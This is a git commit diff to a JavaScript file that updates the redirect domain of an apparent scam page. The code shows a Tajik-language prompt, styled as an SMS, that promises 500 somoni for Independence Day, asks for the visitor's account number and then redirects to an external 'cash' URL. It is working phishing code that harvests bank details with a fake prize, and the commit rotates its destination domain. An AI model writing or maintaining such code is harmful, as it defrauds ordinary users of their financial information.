41ef3a3884ed0dd3138b9a2df495733ad34076ea
ukodriller <fungus_cane_3o@icloud.com>
2026-09-08 19:53:45 +0100

    Update redirect URL for independence day offer

--- taj.js
+++ taj.js
@@ -1,5 +1,5 @@
     var password = 'Tjs500'
 password=prompt('SMS: Салом, барои гирифтани пешниҳоди 500 сомонӣ ба муносибати Рӯзи истиқлолият, рақами ҳисоби худро ворид кунед., Барои гирифтани он ҳозир тугмаи OK-ро пахш кунед','Tjs500');
 if (password != 'Tjs500') {
-location.href='https://www.pikingrow.com/tjs500-independence-day-cash';
+location.href='https://www.iwoiydad.com/tjs500-independence-day-cash';
 }
